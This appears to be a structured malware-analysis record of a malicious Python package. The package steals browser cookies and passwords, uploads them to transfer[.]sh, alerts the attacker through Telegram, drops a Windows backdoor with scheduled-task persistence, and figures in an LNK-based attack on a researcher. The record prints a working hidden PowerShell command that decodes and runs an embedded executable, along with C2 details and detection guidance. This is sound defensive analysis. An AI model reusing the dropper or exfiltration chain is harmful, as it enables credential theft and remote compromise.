package_info.why_malicious: The package is a cross-platform data-stealing malware that exfiltrates sensitive browser data (cookies, passwords) to an external file hosting service and notifies the attacker via a Telegram bot. It also establishes persistence via scheduled tasks and deploys a Windows executable backdoor if on a Windows host.

execution_context.file_location: main Python module of the package

malicious_snippets.code_snippet:
if os.name == 'nt':
    # Download and execute Windows PE backdoor
else:
    # Run native Python data stealer code
# Collect browser cookies and passwords
# Save to temp file
# Upload to transfer[.]sh
# Notify via Telegram bot API with download URL
malicious_snippets.code_behavior: At import-time or runtime, the code checks the OS, collects browser cookies and passwords, saves them to a temp file, uploads the file to transfer[.]sh, and sends the download URL and host info to a hardcoded Telegram bot API endpoint.

malice_analysis.why_suspicious: Automated collection and exfiltration of sensitive data, use of external file hosting, and covert notification to attacker infrastructure.
malice_analysis.violated_expectations: Legitimate packages should not access or exfiltrate browser credentials or communicate with attacker-controlled infrastructure.
malice_analysis.similar_legitimate_use: Automated backup tools may upload files, but never browser secrets or notify unknown Telegram bots.

execution_context.file_location: Windows: downloaded executable from package or LNK file

malicious_snippets.code_snippet: Creates a scheduled task to run the malware executable every 5 minutes using Windows Task Scheduler.
malicious_snippets.code_behavior: At runtime, the code creates a scheduled task to execute the malware every 5 minutes, ensuring persistence on the infected host.

malice_analysis.why_suspicious: Persistence mechanisms are a hallmark of malware, especially when combined with credential theft.
malice_analysis.violated_expectations: Legitimate packages should not create scheduled tasks for persistence.
malice_analysis.similar_legitimate_use: System management tools may use scheduled tasks, but not in this context.

execution_context.file_location: malicious .lnk files inside attacker-sent zip archive

malicious_snippets.code_snippet: /c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk | Where-Object {$_.length -eq 0x00117926} | Select-Object -ExpandProperty Name; $file = Get-Content $lnkpath -Encoding Byte; for($i = 0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x33 } $path = '%temp%\tmp' + (Get-Random) + '.exe'; Set-Content $path ([byte[]]($file | Select-Object -Skip 2838)) -Encoding Byte; & $path
malicious_snippets.code_behavior: Upon user opening the .lnk file, a hidden PowerShell process decodes and writes an embedded executable to the temp directory, then executes it.

malice_analysis.why_suspicious: LNK files masquerading as text files with embedded, obfuscated executables are a classic malware delivery technique.
malice_analysis.violated_expectations: Text files should not execute code or drop executables.
malice_analysis.similar_legitimate_use: None; this is a pure attack vector.

execution_context.file_location: malicious .NET executable dropped by LNK file

malicious_snippets.code_snippet: Malicious .NET executable (SHA-256: 4cf48c2a3933ac4c6733533bf16d40fa4e411fbbf42b03d84d6c8df62e253ad0) communicates with hxxp://128[.]199[.]113[.]162/upwawsfrg[.]php, supports GET/POST, and creates a scheduled task for persistence.
malicious_snippets.code_behavior: At runtime, the executable establishes a backdoor connection to a remote C2 server, enabling data exfiltration and remote payload delivery, and sets up persistence via scheduled tasks.

malice_analysis.why_suspicious: Backdoor communication with a remote C2, persistence, and post-exploitation capabilities are all hallmarks of advanced malware.
malice_analysis.violated_expectations: No legitimate package should drop or execute a backdoor.

attack_chain.action: Malicious Python package is installed and executed, collecting sensitive browser data.
attack_chain.leads_to: Data is exfiltrated to transfer[.]sh and attacker notified via Telegram.

attack_chain.action: On Windows, package downloads and executes a malicious .NET backdoor executable.
attack_chain.leads_to: Persistence is established via scheduled task.

attack_chain.action: Attacker attempts to strike back at the researcher by sending a zip archive with malicious .lnk files.
attack_chain.leads_to: User opens .lnk file, triggering PowerShell payload extraction and execution.

attack_chain.action: Extracted .NET executable runs, connects to C2, and maintains persistence.
attack_chain.leads_to: Attacker gains remote access and post-exploitation capability.

behavioral_signatures: Python packages accessing browser credential stores and uploading to transfer[.]sh
Hardcoded Telegram bot API usage for exfiltration
Creation of scheduled tasks for persistence
LNK files with double extensions and hidden PowerShell payloads
Dropped executables communicating with known C2 infrastructure
detection_knowledge.how_to_detect: Monitor for Python packages that access browser credential stores or upload files to transfer[.]sh, and for any use of hardcoded Telegram bot APIs. Flag creation of scheduled tasks by unknown executables. Detect and quarantine .lnk files with double extensions and embedded PowerShell commands that decode and execute hidden payloads. Block outbound connections to known C2 infrastructure and file hosting services used for exfiltration.
